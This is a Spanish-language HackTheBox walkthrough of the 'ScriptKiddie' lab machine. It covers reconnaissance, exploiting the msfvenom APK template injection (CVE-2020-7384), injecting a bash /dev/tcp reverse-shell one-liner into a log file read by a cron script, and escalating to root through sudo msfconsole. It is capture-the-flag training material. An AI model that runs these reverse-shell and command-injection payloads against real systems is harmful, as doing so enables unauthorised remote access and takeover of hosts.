---
title: HTB - ScriptKiddie
published: true
categories: [Linux]
tags: [eJPT, OSCP, Fácil]
---

<img src="/assets/HTB/ScriptKiddie/scriptkiddie.png">

¡Hola!
Vamos a resolver de la máquina `ScriptKiddie` de dificultad "Fácil" de la plataforma [HackTheBox](https://hackthebox.com/).

Técnicas Vistas: 

- **Msfvenom Exploitation [CVE-2020-7384] [RCE]**
- **Abusing Logs + Cron Job [Command Injection / User Pivoting]**
- **Abusing Sudoers Privilege [Msfconsole Privilege Escalation]**

### Preparación Entorno

* * *

Antes de iniciar la fase de enumeración y reconocimiento procederemos a crear un directorio de trabajo con el nombre `ScriptKiddie`. Una vez creado accedemos al directorio y con la ayuda de la función que tenemos definida en la zshrc `mkt` crearemos cuatro directorios de trabajo `nmap, content, exploits y scripts` donde almacenaremos de una manera ordenada toda la información que vayamos recopilando de la máquina en función de su naturaleza.

```bash
function mkt(){
    mkdir {nmap,content,exploits,scripts}
}
```

### Reconocimiento

* * *

Accedemos al directorio de trabajo `nmap` e iniciamos nuestra fase de reconocimiento realizando un `ping` a la IP de la máquina para comprobar que esté activa y detectamos su sistema operativo basándonos en el `ttl` de una traza **ICMP**.

```bash
❯ ping -c 1 10.10.10.226
PING 10.10.10.226 (10.10.10.226) 56(84) bytes of data.
64 bytes from 10.10.10.226: icmp_seq=1 ttl=63 time=42.3 ms

--- 10.10.10.226 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 42.314/42.314/42.314/0.000 ms
```
Identificamos que es una maquina **Linux** debido a su ttl (time to live) correspondiente a 127 (Disminuye en 1 debido a que realiza un salto adicional en el entorno de HackTHeBox).

* TTL => 64 Linux
* TTL => 128 Windows

Continuamos con la enumeración de los **65535** puertos en la máquina.

```bash
nmap -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.226 -oG allPorts

PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
5000/tcp open  upnp    syn-ack ttl 63

```
Luego de identificar los puertos abiertos `OPEN`, se procede a escanear servicios y versiones que puedan estar corriendo en los puertos abiertos detectados.

```bash
nmap -sCV -p22,5000 10.10.10.226 -oN targeted

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c (RSA)
|   256 b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec (ECDSA)
|_  256 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 (ED25519)
5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)
|_http-title: k1d'5 h4ck3r t00l5
|_http-server-header: Werkzeug/0.16.1 Python/3.8.5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
### Reconocimiento Web

* * *

Iniciamos el reconocimiento del servicio web con la herramienta `whatweb` la cual nos muestra información sobre las tecnologías web que incluyen sistemas de gestión de contenido (CMS), plataformas de blogs, paquetes de estadísticas / análisis, bibliotecas JavaScript, servidores web y dispositivos integrados.

```bash
❯ whatweb http://10.10.10.226:5000

http://10.10.10.226:5000 [200 OK] Country[RESERVED][ZZ], HTTPServer[Werkzeug/0.16.1 Python/3.8.5], IP[10.10.10.226], Python[3.8.5], Title[k1d'5 h4ck3r t00l5], Werkzeug[0.16.1]
```

Accedemos al servicio web por el puerto 5000 y vemos la página principal la cual nos permite el uso de herramientas de `hacking`


<img src="/assets/HTB/ScriptKiddie/web.png">



La sección de `namp` nos permite escanear los 100 puertos más comunes de una IP proporcionada. Probamos con 127.0.0.1


<img src="/assets/HTB/ScriptKiddie/nmap.png">


La sección `sploits` utiliza la herramienta `searchsploit` en función del input que le pongamos


<img src="/assets/HTB/ScriptKiddie/sploits.png">


La sección `payloads` nos permite seleccionar un sistema opeartivo (`windows`, `linux` o `android`), proporcionar una dirección `lhost` y opcionalmente subir un achivo template. Clickando en el botón `generate` nuestra información proporcionada se procesa con `msfvenom` y nos genera un payload. Si todo es correcto nos devuelve un link para un archivo descargable


<img src="/assets/HTB/ScriptKiddie/payload.png">


Buscando vulnerabilidades con la heramienta `searchsploit` localizamos una vulnerabilidad que afecta a `Metasploit 6.0.11`. Aunque no sabemos la versión que nos presenta la web vale la pena intentar a ver si es viable

```bash
❯ searchsploit msfvenom
--------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                           |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Metasploit Framework 6.0.11 - msfvenom APK template command injection                                                                                    | multiple/local/49491.py
--------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

Nos traemos el exploit a nuestro directorio de trabajo y observando su contentido hay que cambiar el payload a ajecutar en el que indicaremos que haga un `curl` a nuestra dirección IP y el contenido lo interpretamos con bash


<img src="/assets/HTB/ScriptKiddie/exploit.png">


Creamos un archivo `index.html` e introducimos el típico oneliner para entablar una reverse shell con bash. Levantamos un servidor web por el puerto 80, nos ponemos en escucha por el puerto 443 y en la web subimos el archivo `apk` malicioso generado con el exploit con la opción de os puerta en `android`


<img src="/assets/HTB/ScriptKiddie/access.png">


la flag de usuario la encontramos en la carpeta personal del usuario `kid`

```bash
kid@scriptkiddie:~/html$ cat /home/kid/user.txt 
d61e528ea4ed26573****************
```

### Movimiento Lateral

* * *

Realizando una enumeración básica nos revela la existencia de otro usuario llamado `pwn`. Dentro de su carpeta home localizamos un script llamado `scanlosers.sh` en el que tenemos capacidad de lectura únicamente. El script parsea filas de `/home/kid/logs/hackers` para leer direcciones IP y ejecuta `nmap` sobre esas IPs

```bash
kid@scriptkiddie:~/html$ cat /home/pwn/scanlosers.sh 
#!/bin/bash

log=/home/kid/logs/hackers

cd /home/pwn/
cat $log | cut -d' ' -f3- | sort -u | while read ip; do
    sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
done

if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi
```

El script fitra del archivo hackers delimitando por un espacio y cogiendo el tercer argumento (`cut -d' ' -f3-`) y lo ordena alfabéticamente (`sort -u`). Adicionalmente no hay validación del input por lo que el script es vulnerable a inyección arbitraria de comandos

Mirando el contenido de la aplicación web (`/home/kid/html/app.py`) vemos que los timestamps y las IPs se guardan en `/home/kid/logs/hackers` cuando se insertan caracteres no alfanuméricos en el input de la sección `searchsploit`


<img src="/assets/HTB/ScriptKiddie/code.png">


Abrimos `netcat` y escribimos un payload revserse shell a `/home/kid/logs/hackers`

```bash
kid@scriptkiddie:/$ echo 'a b $(bash -c "bash -i &>/dev/tcp/10.10.14.33/443 0>&1")' > /home/kid/logs/hackers 
```

```bash
❯ sudo nc -nlvp 443
[sudo] password for yorch: 
listening on [any] 443 ...
connect to [10.10.14.33] from (UNKNOWN) [10.10.10.226] 41028
bash: cannot set terminal process group (803): Inappropriate ioctl for device
bash: no job control in this shell
pwn@scriptkiddie:~$ whoami
whoami
pwn
```

### Escalada de Privilegios

* * *

Mediante el comando `sudo -l` vemos que tenemos la capacidad de ejecutar como root `msfconsole`

```bash
pwn@scriptkiddie:~$ sudo -l
Matching Defaults entries for pwn on scriptkiddie:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pwn may run the following commands on scriptkiddie:
    (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole
pwn@scriptkiddie:~$ sudo msfconsole
                                                  
# cowsay++
 ____________
< metasploit >
 ------------
       \   ,__,
        \  (oo)____
           (__)    )\
              ||--|| *


       =[ metasploit v6.0.9-dev                           ]
+ -- --=[ 2069 exploits - 1122 auxiliary - 352 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: Enable verbose logging with set VERBOSE true

msf6 > 
```

Desde `msfconsole` podemos entrar en una shell de Ruby con el comando `irb` y llamar a `system()` para ejecutar comandos de sistema. Esto nos permite conseguir una shell con privilegios de root

```bash
msf6 > irb
[*] Starting IRB shell...
[*] You are in the "framework" object

irb: warn: can't alias jobs from irb_jobs.
>> system("/bin/bash")
root@scriptkiddie:/home/pwn# whoami
root
```

La flag de root la encontramos en el directorio `/root`

```bash
root@scriptkiddie:/home/pwn# cat /root/root.txt 
3e4917ca3ca64c34***************
```

Hemos completado la máquina **ScriptKiddie** de HackTheBox!! Happy Hacking!!


<img src="/assets/HTB/ScriptKiddie/pwned.png">
